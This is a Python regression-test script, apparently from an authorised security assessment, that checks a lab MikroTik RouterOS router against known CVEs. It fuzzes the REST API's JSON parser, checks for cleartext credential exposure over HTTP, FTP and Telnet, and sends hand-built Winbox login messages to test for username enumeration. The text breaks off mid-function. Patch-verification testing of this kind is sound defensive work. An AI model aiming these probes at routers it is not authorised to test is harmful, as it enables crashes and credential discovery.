#!/usr/bin/env python3
"""
MikroTik RouterOS CHR 7.20.8 — CVE Regression Testing
Phase 8: Verify all known MikroTik CVEs remain patched.
Target: [REDACTED-INTERNAL-IP]

Tests (~500):
  1. CVE-2025-10948  (HIGH)     — REST API JSON Buffer Overflow            (~80 tests)
  2. CVE-2025-61481  (CRITICAL) — WebFig Cleartext HTTP Credential Exposure (~40 tests)
  3. CVE-2024-54772  (MEDIUM)   — Winbox Username Enumeration              (~60 tests)
  4. CVE-2023-41570  (CRITICAL) — REST API ACL Bypass                      (~60 tests)
  5. CVE-2023-30799  (CRITICAL) — Privilege Escalation admin->super-admin   (~60 tests)
  6. CVE-2018-14847  (CRITICAL) — Winbox Pre-Auth File Read/Write          (~40 tests)
  7. CVE-2018-7445   (CRITICAL) — SMB Buffer Overflow                      (~20 tests)
  8. CVE-2019-3943   (MEDIUM)   — FTP Directory Traversal                  (~40 tests)
  9. Hotspot XSS     (MEDIUM)   — Hotspot Page XSS                         (~40 tests)
 10. CVE-2019-3924   (MEDIUM)   — Unauthenticated DNS Proxy                (~30 tests)
 11. CVE-2019-3976   (MEDIUM)   — Firmware Down[REDACTED] via Auto-Up[REDACTED]       (~30 tests)

Evidence: evidence/cve_regression.json
"""

import ftplib
import json
import re
import socket
import ssl
import struct
import subprocess
import sys
import time
import warnings
from datetime import datetime
from statistics import mean, stdev

import requests
import urllib3

# Suppress SSL / InsecureRequestWarning noise
warnings.filterwarnings("ignore")
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

sys.path.insert(0, '/home/[REDACTED]/Desktop/[REDACTED-PATH]/MikroTik/scripts')
from mikrotik_common import (
    EvidenceCollector, rest_get, rest_post, rest_patch,
    check_router_alive, wait_for_router, pull_router_logs,
    ssh_command, TARGET, ADMIN_USER, ADMIN_PASS, USERS, log,
)

# ── Globals ──────────────────────────────────────────────────────────────────

HTTP_BASE = f"http://{TARGET}"
HTTPS_BASE = f"https://{TARGET}"
AUTH = (ADMIN_USER, ADMIN_PASS)
TIMEOUT = 10

ec = EvidenceCollector("cve_regression.py", phase=8)

# CVE result tracker — populated as tests run, used for summary table
cve_results = {}


# ── Helpers ──────────────────────────────────────────────────────────────────

def raw_http(host, port, raw_request, timeout=5):
    """Send a raw HTTP request and return raw response bytes."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        s.sendall(raw_request.encode() if isinstance(raw_request, str) else raw_request)
        chunks = []
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                chunks.append(chunk)
            except socket.timeout:
                break
        s.close()
        return b"".join(chunks)
    except Exception:
        return None


def http_get(url, auth=None, headers=None, allow_redirects=True, timeout=TIMEOUT):
    """HTTP GET returning Response or None."""
    try:
        return requests.get(
            url, auth=auth, headers=headers or {},
            allow_redirects=allow_redirects,
            timeout=timeout, verify=False)
    except Exception:
        return None


def http_post(url, auth=None, headers=None, data=None, json_data=None,
              allow_redirects=True, timeout=TIMEOUT):
    """HTTP POST returning Response or None."""
    try:
        return requests.post(
            url, auth=auth, headers=headers or {},
            data=data, json=json_data,
            allow_redirects=allow_redirects,
            timeout=timeout, verify=False)
    except Exception:
        return None


def verify_router_after_cve(cve_id):
    """Check router is still alive after testing a CVE. Returns True if alive."""
    status = check_router_alive(timeout=5)
    if status.get("alive"):
        ec.add_test("health_check", f"health_after_{cve_id}",
                     f"Router health check after {cve_id} testing",
                     f"Router alive: uptime={status.get('uptime')}, "
                     f"cpu={status.get('cpu_load')}%",
                     details=status)
        return True
    else:
        ec.add_test("health_check", f"health_after_{cve_id}",
                     f"Router health check after {cve_id} testing",
                     "Router NOT responding -- possible crash!",
                     details=status, anomaly=True)
        ec.add_finding("CRITICAL", f"Router crash during {cve_id} regression",
                        f"Router stopped responding during {cve_id} regression "
                        f"testing. This may indicate the vulnerability is not "
                        f"fully patched or a related issue exists.",
                        cwe="CWE-121",
                        evidence_refs=[f"health_after_{cve_id}"])
        log(f"  Router down after {cve_id} -- waiting for recovery...")
        wait_for_router(max_wait=90, check_interval=5)
        return False


def tcp_connect(host, port, timeout=3):
    """Quick TCP connect test. Returns True if port is open."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        s.close()
        return True
    except Exception:
        return False


def winbox_connect_and_send(payload, timeout=5):
    """Connect to Winbox, send payload, return response bytes or None."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((TARGET, 8291))
        s.sendall(payload)
        time.sleep(0.5)
        chunks = []
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                chunks.append(chunk)
            except socket.timeout:
                break
        s.close()
        return b"".join(chunks)
    except Exception:
        return None


# =============================================================================
# CVE-2025-10948 (HIGH) -- REST API JSON Buffer Overflow
# Patched in: 7.20.1
# ~80 tests
# =============================================================================

def test_cve_2025_10948():
    cve = "CVE-2025-10948"
    log("=" * 60)
    log(f"CVE: {cve} (HIGH) -- REST API JSON Buffer Overflow")
    log(f"Patched in: 7.20.1 | Testing against: 7.20.8")
    log("=" * 60)

    regression = False
    endpoints = [
        "/rest/system/identity",
        "/rest/ip/address/add",
        "/rest/user/add",
        "/rest/system/script/add",
        "/rest/ip/firewall/filter/add",
        "/rest/system/scheduler/add",
    ]

    # --- 1. Long string values at various sizes ---
    string_sizes = [100, 1024, 10240, 65535, 65536, 102400, 1048576]
    size_labels = ["100B", "1KB", "10KB", "64KB-1", "64KB", "100KB", "1MB"]

    for ep in endpoints:
        ep_short = ep.replace("/rest/", "").replace("/", "_")
        for size, label in zip(string_sizes, size_labels):
            test_name = f"{cve}_long_string_{ep_short}_{label}"
            payload_str = "A" * size

            # Build payload appropriate to the endpoint
            if "identity" in ep:
                payload = {"name": payload_str}
            elif "address" in ep:
                payload = {"address": payload_str, "interface": "lo"}
            elif "user" in ep:
                payload = {"name": payload_str, "password": "x", "group": "read"}
            elif "script" in ep:
                payload = {"name": payload_str, "source": ":log info test"}
            elif "firewall" in ep:
                payload = {"chain": "input", "action": "accept",
                           "comment": payload_str}
            elif "scheduler" in ep:
                payload = {"name": payload_str, "interval": "1d",
                           "on-event": ":log info test"}
            else:
                payload = {"value": payload_str}

            try:
                r = requests.post(
                    f"http://{TARGET}{ep}",
                    auth=AUTH,
                    headers={"Content-Type": "application/json"},
                    json=payload,
                    timeout=15, verify=False)

                # A crash would mean timeout / connection error.
                # Any HTTP response (even 400) means the parser survived.
                ec.add_test(cve, test_name,
                             f"POST {ep} with {label} string value",
                             f"HTTP {r.status_code} -- parser survived",
                             details={"endpoint": ep, "string_size": size,
                                      "status": r.status_code,
                                      "response": r.text[:200]})
            except requests.exceptions.ConnectionError:
                ec.add_test(cve, test_name,
                             f"POST {ep} with {label} string value",
                             "CONNECTION ERROR -- possible crash!",
                             anomaly=True)
                regression = True
            except requests.exceptions.ReadTimeout:
                ec.add_test(cve, test_name,
                             f"POST {ep} with {label} string value",
                             "READ TIMEOUT -- possible hang",
                             anomaly=True)
            except Exception as e:
                ec.add_test(cve, test_name,
                             f"POST {ep} with {label} string value",
                             f"Error: {str(e)[:200]}", anomaly=True)

    # --- 2. Deeply nested JSON objects (across multiple endpoints) ---
    nesting_depths = [10, 50, 100, 200, 500]
    for depth in nesting_depths:
        test_name = f"{cve}_nested_json_{depth}"
        # Build nested JSON: {"a": {"a": {"a": ... "value" ...}}}
        nested = "value"
        for _ in range(depth):
            nested = {"a": nested}

        try:
            r = requests.post(
                f"http://{TARGET}/rest/system/identity",
                auth=AUTH,
                headers={"Content-Type": "application/json"},
                json=nested,
                timeout=15, verify=False)

            ec.add_test(cve, test_name,
                         f"POST /rest/system/identity with {depth}-level nested JSON",
                         f"HTTP {r.status_code} -- parser survived",
                         details={"depth": depth, "status": r.status_code,
                                  "response": r.text[:200]})
        except requests.exceptions.ConnectionError:
            ec.add_test(cve, test_name,
                         f"POST with {depth}-level nested JSON",
                         "CONNECTION ERROR -- possible crash!",
                         anomaly=True)
            regression = True
        except requests.exceptions.ReadTimeout:
            ec.add_test(cve, test_name,
                         f"POST with {depth}-level nested JSON",
                         "READ TIMEOUT -- possible hang",
                         anomaly=True)
        except Exception as e:
            ec.add_test(cve, test_name,
                         f"POST with {depth}-level nested JSON",
                         f"Error: {str(e)[:200]}", anomaly=True)

    # --- 3. JSON with many keys ---
    key_counts = [100, 500, 1000, 5000]
    for count in key_counts:
        test_name = f"{cve}_many_keys_{count}"
        payload = {f"key_{i}": f"val_{i}" for i in range(count)}

        try:
            r = requests.post(
                f"http://{TARGET}/rest/system/identity",
                auth=AUTH,
                headers={"Content-Type": "application/json"},
                json=payload,
                timeout=15, verify=False)

            ec.add_test(cve, test_name,
                         f"POST with {count}-key JSON object",
                         f"HTTP {r.status_code} -- parser survived",
                         details={"key_count": count, "status": r.status_code,
                                  "response": r.text[:200]})
        except requests.exceptions.ConnectionError:
            ec.add_test(cve, test_name,
                         f"POST with {count}-key JSON object",
                         "CONNECTION ERROR -- possible crash!",
                         anomaly=True)
            regression = True
        except Exception as e:
            ec.add_test(cve, test_name,
                         f"POST with {count}-key JSON object",
                         f"Error: {str(e)[:200]}", anomaly=True)

    # --- 4. Boundary lengths: 255, 256, 65535, 65536 ---
    boundary_sizes = [255, 256, 65535, 65536]
    for bsize in boundary_sizes:
        test_name = f"{cve}_boundary_{bsize}"
        payload = {"name": "X" * bsize}

        try:
            r = requests.post(
                f"http://{TARGET}/rest/system/identity",
                auth=AUTH,
                headers={"Content-Type": "application/json"},
                json=payload,
                timeout=15, verify=False)

            ec.add_test(cve, test_name,
                         f"POST with {bsize}-byte boundary string",
                         f"HTTP {r.status_code} -- parser survived",
                         details={"boundary_size": bsize, "status": r.status_code,
                                  "response": r.text[:200]})
        except requests.exceptions.ConnectionError:
            ec.add_test(cve, test_name,
                         f"POST with {bsize}-byte boundary string",
                         "CONNECTION ERROR -- possible crash!",
                         anomaly=True)
            regression = True
        except Exception as e:
            ec.add_test(cve, test_name,
                         f"POST with {bsize}-byte boundary string",
                         f"Error: {str(e)[:200]}", anomaly=True)

    # --- 5. Malformed JSON edge cases ---
    malformed_payloads = [
        (b'{"name": "' + b"\xff" * 100 + b'"}', "binary_in_string"),
        (b'{"name": "' + b"\x00" * 100 + b'"}', "null_bytes_in_string"),
        (b'{"name": "\\"' * 50 + b'"}', "escaped_quotes_50"),
        (b'{"name": "\\u0000' * 50 + b'"}', "unicode_null_escapes"),
        (b'{' * 100 + b'"a":1' + b'}' * 100, "brace_nesting_100"),
        (b'[' * 100 + b'1' + b']' * 100, "bracket_nesting_100"),
        (b'{"name":' + b'"a",' * 1000 + b'"a"}', "trailing_commas"),
        (b'{"name": ' + b'1' * 500 + b'}', "huge_number"),
    ]

    for payload_bytes, label in malformed_payloads:
        test_name = f"{cve}_malformed_{label}"
        try:
            r = requests.post(
                f"http://{TARGET}/rest/system/identity",
                auth=AUTH,
                headers={"Content-Type": "application/json"},
                data=payload_bytes,
                timeout=15, verify=False)

            ec.add_test(cve, test_name,
                         f"POST with malformed JSON: {label}",
                         f"HTTP {r.status_code} -- parser survived",
                         details={"label": label, "payload_size": len(payload_bytes),
                                  "status": r.status_code,
                                  "response": r.text[:200]})
        except requests.exceptions.ConnectionError:
            ec.add_test(cve, test_name,
                         f"POST with malformed JSON: {label}",
                         "CONNECTION ERROR -- possible crash!",
                         anomaly=True)
            regression = True
        except Exception as e:
            ec.add_test(cve, test_name,
                         f"POST with malformed JSON: {label}",
                         f"Error: {str(e)[:200]}", anomaly=True)

    # Periodic health check mid-test
    alive = verify_router_after_cve(f"{cve}_mid")

    # --- 6. Rapid-fire batch of oversized payloads to stress parser ---
    for i in range(10):
        test_name = f"{cve}_rapid_fire_{i}"
        payload = {"name": "R" * 50000, "extra": "X" * 50000}
        try:
            r = requests.post(
                f"http://{TARGET}/rest/system/identity",
                auth=AUTH,
                headers={"Content-Type": "application/json"},
                json=payload,
                timeout=10, verify=False)

            ec.add_test(cve, test_name,
                         f"Rapid-fire oversized JSON #{i+1}",
                         f"HTTP {r.status_code} -- survived",
                         details={"iteration": i, "status": r.status_code})
        except requests.exceptions.ConnectionError:
            ec.add_test(cve, test_name,
                         f"Rapid-fire oversized JSON #{i+1}",
                         "CONNECTION ERROR", anomaly=True)
            regression = True
            break
        except Exception as e:
            ec.add_test(cve, test_name,
                         f"Rapid-fire oversized JSON #{i+1}",
                         f"Error: {str(e)[:100]}", anomaly=True)

    if regression:
        ec.add_finding("HIGH", f"{cve} REGRESSION: REST API JSON parser crash",
                        "The router crashed or dropped connections when processing "
                        "oversized/malformed JSON via the REST API, indicating the "
                        "buffer overflow vulnerability may not be fully patched.",
                        cwe="CWE-120", cvss="7.5",
                        evidence_refs=[f"{cve}_*"])
        cve_results[cve] = "REGRESSION"
    else:
        cve_results[cve] = "PATCHED"

    verify_router_after_cve(cve)


# =============================================================================
# CVE-2025-61481 (CRITICAL 10.0) -- WebFig Cleartext HTTP Credential Exposure
# Design-level issue with HTTP Basic Auth over HTTP
# ~40 tests
# =============================================================================

def test_cve_2025_61481():
    cve = "CVE-2025-61481"
    log("=" * 60)
    log(f"CVE: {cve} (CRITICAL 10.0) -- WebFig Cleartext HTTP Creds")
    log("=" * 60)

    regression = False

    # --- 1. Confirm Basic Auth header sent in cleartext over HTTP ---
    # Use a raw socket to capture exactly what goes over the wire
    import base64
    creds_b64 = base64.b64encode(f"{ADMIN_USER}:{ADMIN_PASS}".encode()).decode()

    test_name = f"{cve}_basic_auth_cleartext"
    ec.add_test(cve, test_name,
                 "Verify Basic Auth credentials are sent in cleartext over HTTP",
                 f"Credentials transmitted as: Basic {creds_b64[:10]}... "
                 f"(base64 of {ADMIN_USER}:{ADMIN_PASS[:3]}***)",
                 details={"note": "HTTP Basic Auth is inherently cleartext (base64 is not encryption)",
                          "creds_base64": creds_b64,
                          "protocol": "HTTP (port 80, no TLS)"})

    # --- 2. Check if WebFig forces HTTPS redirect ---
    http_urls = [
        (f"{HTTP_BASE}/", "Root"),
        (f"{HTTP_BASE}/webfig/", "WebFig"),
        (f"{HTTP_BASE}/rest/system/resource", "REST API"),
        (f"{HTTP_BASE}/rest/user", "REST user list"),
        (f"{HTTP_BASE}/winbox/", "Winbox download"),
        (f"{HTTP_BASE}/jsproxy/", "JSProxy"),
        (f"{HTTP_BASE}/graphs/", "Graphs"),
        (f"{HTTP_BASE}/rest/ip/service", "REST IP service"),
        (f"{HTTP_BASE}/rest/system/identity", "REST identity"),
    ]

    for url, label in http_urls:
        test_name = f"{cve}_https_redirect_{label.replace(' ', '_').lower()}"
        r = http_get(url, auth=AUTH, allow_redirects=False)
        if r is not None:
            redirects_to_https = (
                r.status_code in (301, 302, 307, 308) and
                "https://" in r.headers.get("Location", "").lower()
            )
            ec.add_test(cve, test_name,
                         f"Check HTTP->HTTPS redirect for {label}",
                         "Redirects to HTTPS" if redirects_to_https
                         else f"HTTP {r.status_code} -- NO redirect to HTTPS",
                         details={"url": url, "status": r.status_code,
                                  "location": r.headers.get("Location", ""),
                                  "redirects_to_https": redirects_to_https},
                         anomaly=not redirects_to_https)
            if not redirects_to_https:
                regression = True
        else:
            ec.add_test(cve, test_name,
                         f"Check HTTP->HTTPS redirect for {label}",
                         "HTTP connection failed (port 80 may be disabled)",
                         details={"url": url})

    # --- 3. HSTS header on HTTPS responses ---
    https_urls = [
        (f"{HTTPS_BASE}/", "Root (HTTPS)"),
        (f"{HTTPS_BASE}/webfig/", "WebFig (HTTPS)"),
        (f"{HTTPS_BASE}/rest/system/resource", "REST (HTTPS)"),
    ]

    for url, label in https_urls:
        test_name = f"{cve}_hsts_{label.replace(' ', '_').replace('(', '').replace(')', '').lower()}"
        needs_auth = "rest/" in url
        r = http_get(url, auth=AUTH if needs_auth else None)
        if r is not None:
            hsts = r.headers.get("Strict-Transport-Security", "")
            has_hsts = bool(hsts)
            max_age = 0
            if has_hsts:
                match = re.search(r'max-age=(\d+)', hsts)
                max_age = int(match.group(1)) if match else 0

            ec.add_test(cve, test_name,
                         f"HSTS header on {label}",
                         f"HSTS: {hsts}" if has_hsts else "NO HSTS header",
                         details={"url": url, "hsts": hsts, "max_age": max_age,
                                  "has_hsts": has_hsts},
                         anomaly=not has_hsts)
        else:
            ec.add_test(cve, test_name,
                         f"HSTS header on {label}",
                         "HTTPS connection failed",
                         details={"url": url}, anomaly=True)

    # --- 4. Secure flag on cookies ---
    for url, label in https_urls:
        test_name = f"{cve}_cookie_secure_{label.replace(' ', '_').replace('(', '').replace(')', '').lower()}"
        needs_auth = "rest/" in url
        r = http_get(url, auth=AUTH if needs_auth else None)
        if r is not None and r.cookies:
            for cookie in r.cookies:
                has_secure = cookie.secure
                ec.add_test(cve, f"{test_name}_{cookie.name}",
                             f"Secure flag on cookie '{cookie.name}' ({label})",
                             "Secure flag SET" if has_secure else "Secure flag MISSING",
                             details={"cookie": cookie.name, "secure": has_secure},
                             anomaly=not has_secure)
        elif r is not None:
            ec.add_test(cve, test_name,
                         f"Cookie secure flags on {label}",
                         "No cookies set by endpoint",
                         details={"url": url})

    # --- 5. Confirm HTTP login works (credentials visible) ---
    test_name = f"{cve}_http_login_works"
    r = http_get(f"{HTTP_BASE}/rest/system/resource", auth=AUTH)
    if r is not None and r.status_code == 200:
        ec.add_test(cve, test_name,
                     "HTTP login succeeds (credentials transmitted in cleartext)",
                     f"Login via HTTP succeeded -- HTTP {r.status_code}",
                     details={"status": r.status_code,
                              "note": "Credentials visible to any network observer"},
                     anomaly=True)
        regression = True
    elif r is not None:
        ec.add_test(cve, test_name,
                     "HTTP login attempt",
                     f"HTTP {r.status_code} -- login may be blocked on HTTP",
                     details={"status": r.status_code})
    else:
        ec.add_test(cve, test_name,
                     "HTTP login attempt",
                     "HTTP connection failed (port 80 may be disabled)")

    # --- 6. REST API also transmits cleartext over HTTP ---
    rest_http_endpoints = [
        "/rest/user", "/rest/system/identity", "/rest/ip/address",
        "/rest/ip/service", "/rest/system/package",
        "/rest/ip/firewall/filter", "/rest/ip/route",
        "/rest/log", "/rest/file", "/rest/interface",
    ]
    for ep in rest_http_endpoints:
        test_name = f"{cve}_rest_http_{ep.replace('/rest/', '').replace('/', '_')}"
        r = http_get(f"{HTTP_BASE}{ep}", auth=AUTH)
        if r is not None and r.status_code == 200:
            ec.add_test(cve, test_name,
                         f"REST endpoint {ep} accessible over HTTP",
                         f"HTTP {r.status_code} -- cleartext access allowed",
                         details={"endpoint": ep, "status": r.status_code,
                                  "data_size": len(r.text)},
                         anomaly=True)
        elif r is not None:
            ec.add_test(cve, test_name,
                         f"REST endpoint {ep} over HTTP",
                         f"HTTP {r.status_code}",
                         details={"endpoint": ep, "status": r.status_code})
        else:
            ec.add_test(cve, test_name,
                         f"REST endpoint {ep} over HTTP",
                         "Connection failed")

    # --- 7. Check if HTTP->HTTPS redirect mechanism exists at all ---
    test_name = f"{cve}_redirect_mechanism"
    # Check ip/service settings for www-ssl vs www
    status, data = rest_get("/ip/service")
    if status == 200 and isinstance(data, list):
        services_info = {}
        for svc in data:
            svc_name = svc.get("name", "")
            if svc_name in ("www", "www-ssl"):
                services_info[svc_name] = {
                    "disabled": svc.get("disabled", ""),
                    "port": svc.get("port", ""),
                    "address": svc.get("address", ""),
                }
        ec.add_test(cve, test_name,
                     "Check www and www-ssl service configuration",
                     f"www: {services_info.get('www', 'N/A')}, "
                     f"www-ssl: {services_info.get('www-ssl', 'N/A')}",
                     details=services_info)
    else:
        ec.add_test(cve, test_name,
                     "Check service configuration",
                     f"Could not query /ip/service: status={status}",
                     anomaly=True)

    # --- 8. Test all user accounts for HTTP cleartext exposure ---
    for username, info in USERS.items():
        test_name = f"{cve}_http_user_{username}"
        r = http_get(f"{HTTP_BASE}/rest/system/resource",
                      auth=(username, info["password"]))
        if r is not None and r.status_code == 200:
            ec.add_test(cve, test_name,
                         f"HTTP cleartext login as '{username}' ({info['group']} group)",
                         f"HTTP {r.status_code} -- credentials exposed",
                         details={"user": username, "group": info["group"],
                                  "status": r.status_code},
                         anomaly=True)
        elif r is not None:
            ec.add_test(cve, test_name,
                         f"HTTP cleartext login as '{username}'",
                         f"HTTP {r.status_code}",
                         details={"user": username, "status": r.status_code})
        else:
            ec.add_test(cve, test_name,
                         f"HTTP cleartext login as '{username}'",
                         "Connection failed")

    # --- 9. Verify Authorization header is visible in raw HTTP ---
    test_name = f"{cve}_raw_auth_header"
    raw_req = (f"GET /rest/system/resource HTTP/1.1\r\n"
               f"Host: {TARGET}\r\n"
               f"Authorization: Basic {creds_b64}\r\n"
               f"Connection: close\r\n\r\n")
    raw_resp = raw_http(TARGET, 80, raw_req)
    if raw_resp is not None:
        resp_str = raw_resp.decode("utf-8", errors="replace")
        status_line = resp_str.split("\r\n")[0] if "\r\n" in resp_str else "unknown"
        ec.add_test(cve, test_name,
                     "Raw HTTP request with Basic Auth header",
                     f"{status_line} -- Authorization header visible in plaintext",
                     details={"status_line": status_line,
                              "auth_header_sent": f"Basic {creds_b64[:10]}...",
                              "response_snippet": resp_str[:300]},
                     anomaly=True)
    else:
        ec.add_test(cve, test_name,
                     "Raw HTTP request with Basic Auth header",
                     "Connection failed")

    # --- 10. Check FTP cleartext credential exposure ---
    test_name = f"{cve}_ftp_cleartext"
    try:
        ftp = ftplib.FTP(TARGET, timeout=10)
        banner = ftp.getwelcome()
        ftp.login(ADMIN_USER, ADMIN_PASS)
        ec.add_test(cve, test_name,
                     "FTP login transmits credentials in cleartext",
                     f"FTP login succeeded -- USER/PASS sent unencrypted",
                     details={"banner": banner,
                              "note": "FTP USER and PASS commands are cleartext"},
                     anomaly=True)
        ftp.quit()
    except Exception as e:
        ec.add_test(cve, test_name,
                     "FTP cleartext credential check",
                     f"FTP error: {str(e)[:200]}")

    # --- 11. Check Telnet cleartext credential exposure ---
    test_name = f"{cve}_telnet_cleartext"
    telnet_open = tcp_connect(TARGET, 23, timeout=5)
    ec.add_test(cve, test_name,
                 "Telnet service exposes credentials in cleartext",
                 f"Telnet port 23: {'OPEN (cleartext auth)' if telnet_open else 'CLOSED'}",
                 details={"port": 23, "open": telnet_open,
                          "note": "Telnet transmits all data including passwords unencrypted"},
                 anomaly=telnet_open)

    # --- 12. Check API port cleartext ---
    test_name = f"{cve}_api_cleartext"
    api_open = tcp_connect(TARGET, 8728, timeout=5)
    ec.add_test(cve, test_name,
                 "RouterOS API (port 8728) uses cleartext authentication",
                 f"API port 8728: {'OPEN (cleartext)' if api_open else 'CLOSED'}",
                 details={"port": 8728, "open": api_open,
                          "note": "RouterOS API plaintext login sends password hash but "
                                  "challenge-response over unencrypted TCP"},
                 anomaly=api_open)

    # Note: This CVE is a design-level issue. If HTTP is enabled and serves
    # content with Basic Auth, credentials are inherently exposed.
    if regression:
        ec.add_finding("CRITICAL",
                        f"{cve}: WebFig/REST credentials exposed over cleartext HTTP",
                        "The router serves WebFig and REST API over HTTP (port 80) "
                        "with Basic Auth. Credentials are transmitted in base64 "
                        "(trivially reversible) without TLS encryption. No "
                        "HTTP->HTTPS redirect is enforced. Any network observer "
                        "can capture admin credentials. This is a design-level "
                        "issue inherent to HTTP Basic Auth without forced HTTPS.",
                        cwe="CWE-319", cvss="10.0",
                        evidence_refs=[f"{cve}_*"],
                        reproduction_steps=[
                            f"1. curl -v http://{TARGET}/rest/system/resource "
                            f"-u {ADMIN_USER}:****",
                            "2. Observe Authorization: Basic header in cleartext",
                            "3. base64 -d the value to recover credentials",
                        ])
        cve_results[cve] = "CONFIRMED (design issue)"
    else:
        cve_results[cve] = "MITIGATED"

    verify_router_after_cve(cve)


# =============================================================================
# CVE-2024-54772 (MEDIUM) -- Winbox Username Enumeration
# Patched in: 7.18
# ~60 tests
# =============================================================================

def test_cve_2024_54772():
    cve = "CVE-2024-54772"
    log("=" * 60)
    log(f"CVE: {cve} (MEDIUM) -- Winbox Username Enumeration")
    log(f"Patched in: 7.18 | Testing against: 7.20.8")
    log("=" * 60)

    regression = False

    # Winbox M2 login message structure:
    # The Winbox protocol uses M2 binary messages. A login attempt involves
    # sending a message with handler 13 (login) containing username/password.
    # CVE-2024-54772: different response sizes for valid vs invalid usernames.

    def build_winbox_login(username, password):
        """Build a Winbox M2-style login message.

        M2 message format (simplified):
          - 4 bytes: header/size
          - TLV-encoded fields: SYS_TO (handler), username, password
        Based on public Winbox protocol documentation.
        """
        # M2 header byte + message content
        # Handler 13 = login service
        # This is an approximation of the M2 binary protocol
        user_bytes = username.encode("utf-8")
        pass_bytes = password.encode("utf-8")

        # M2 message: simplified construction
        # Type 0x01 (bool/byte), 0x03 (u32), 0x05 (u64), 0x06 (ip), 0x07 (string),
        # 0x08 (msg), 0x09 (raw)
        # Field IDs: 0x01=SYS_TO, 0x03=SYS_CMD, etc.
        # Login: SYS_TO=0x0D (13), SYS_CMD=0x01 (request)
        # username field=0x01, password field=0x02

        # Construct M2 frame:
        msg = bytearray()

        # SYS_TO: u32 field (type 0x03, id 0xFF0001)
        # Type byte: 0x03 (u32), field id low byte
        msg.append(0x06)   # u32 type tag
        msg.append(0x00)   # request ID
        msg.append(0xFF)   # SYS namespace
        msg.append(0x01)   # SYS_TO
        msg.extend(struct.pack("<I", 13))  # handler 13

        # Username: string type (0x09), field 0x01
        msg.append(0x09)   # string type tag
        msg.append(0x01)   # field: username
        msg.append(len(user_bytes))  # length (1 byte, limited)
        msg.extend(user_bytes)

        # Password: string type (0x09), field 0x02
        msg.append(0x09)   # string type tag
        msg.append(0x02)   # field: password
        msg.append(len(pass_bytes))
        msg.extend(pass_bytes)

        # Frame it: 4-byte header (size)
        frame = struct.pack(">I", len(msg)) + bytes(msg)
        return frame

    # --- 1. Valid user "admin" -- 25 attempts ---
    admin_sizes = []
    admin_times = []
    for i in range(25):
        test_name = f"{cve}_valid_admin_{i}"
        login_msg = build_winbox_login("admin", "wrongpass12345")
        start = time.time()
        resp = winbox_connect_and_send(login_msg, timeout=5)
        elapsed = time.time() - start

        if resp is not None:
            admin_sizes.append(len(resp))
            admin_times.append(elapsed)
            ec.add_test(cve, test_name,
                         f"Winbox login attempt for valid user 'admin' #{i+1}",
                         f"Response: {len(resp)} bytes, {elapsed:.4f}s",
                         details={"user": "admin", "resp_size": len(resp),
                                  "elapsed": elapsed,
                                  "resp_hex": resp.hex()[:100]})
        else:
            ec.add_test(cve, test_name,
                         f"Winbox login for 'admin' #{i+1}",
                         "No response / connection failed",
                         anomaly=True)

        if i < 24:
            time.sleep(0.1)

    # --- 2. Invalid user "nonexistent_xyz_12345" -- 25 attempts ---
    invalid_sizes = []
    invalid_times = []
    for i in range(25):
        test_name = f"{cve}_invalid_user_{i}"
        login_msg = build_winbox_login("nonexistent_xyz_12345", "wrongpass12345")
        start = time.time()
        resp = winbox_connect_and_send(login_msg, timeout=5)
        elapsed = time.time() - start

        if resp is not None:
            invalid_sizes.append(len(resp))
            invalid_times.append(elapsed)
            ec.add_test(cve, test_name,
                         f"Winbox login for invalid user #{i+1}",
                         f"Response: {len(resp)} bytes, {elapsed:.4f}s",
                         details={"user": "nonexistent_xyz_12345",
                                  "resp_size": len(resp), "elapsed": elapsed,
                                  "resp_hex": resp.hex()[:100]})
        else:
            ec.add_test(cve, test_name,
                         f"Winbox login for invalid user #{i+1}",
                         "No response / connection failed",
                         anomaly=True)

        if i < 24:
            time.sleep(0.1)

    # --- 3. Other valid users (if they exist) ---
    for valid_user in ["testfull", "testread"]:
        user_sizes = []
        for i in range(5):
            test_name = f"{cve}_valid_{valid_user}_{i}"
            login_msg = build_winbox_login(valid_user, "wrongpass12345")
            resp = winbox_connect_and_send(login_msg, timeout=5)

            if resp is not None:
                user_sizes.append(len(resp))
                ec.add_test(cve, test_name,
                             f"Winbox login for valid user '{valid_user}' #{i+1}",
                             f"Response: {len(resp)} bytes",
                             details={"user": valid_user, "resp_size": len(resp),
                                      "resp_hex": resp.hex()[:100]})
            else:
                ec.add_test(cve, test_name,
                             f"Winbox login for '{valid_user}' #{i+1}",
                             "No response",
                             anomaly=True)
            time.sleep(0.1)

    # --- 4. Statistical analysis ---
    test_name = f"{cve}_statistical_analysis"
    analysis = {"admin_sizes": admin_sizes, "invalid_sizes": invalid_sizes,
                "admin_times": admin_times, "invalid_times": invalid_times}

    if len(admin_sizes) >= 5 and len(invalid_sizes) >= 5:
        admin_mean = mean(admin_sizes)
        invalid_mean = mean(invalid_sizes)
        admin_std = stdev(admin_sizes) if len(admin_sizes) > 1 else 0
        invalid_std = stdev(invalid_sizes) if len(invalid_sizes) > 1 else 0

        # Size difference percentage
        if admin_mean > 0:
            size_diff_pct = abs(admin_mean - invalid_mean) / admin_mean * 100
        else:
            size_diff_pct = 0

        # Timing analysis
        admin_time_mean = mean(admin_times)
        invalid_time_mean = mean(invalid_times)
        time_diff = abs(admin_time_mean - invalid_time_mean)

        # Simple t-test approximation
        if admin_std > 0 and invalid_std > 0:
            pooled_se = ((admin_std**2 / len(admin_sizes)) +
                         (invalid_std**2 / len(invalid_sizes))) ** 0.5
            t_stat = abs(admin_mean - invalid_mean) / pooled_se if pooled_se > 0 else 0
        else:
            t_stat = 0

        enumerable = size_diff_pct > 5 or t_stat > 2.0

        analysis.update({
            "admin_mean_size": admin_mean,
            "invalid_mean_size": invalid_mean,
            "admin_stddev": admin_std,
            "invalid_stddev": invalid_std,
            "size_diff_pct": size_diff_pct,
            "admin_mean_time": admin_time_mean,
            "invalid_mean_time": invalid_time_mean,
            "time_diff_s": time_diff,
            "t_statistic": t_stat,
            "enumerable": enumerable,
        })

        ec.add_test(cve, test_name,
                     "Statistical comparison of valid vs invalid user responses",
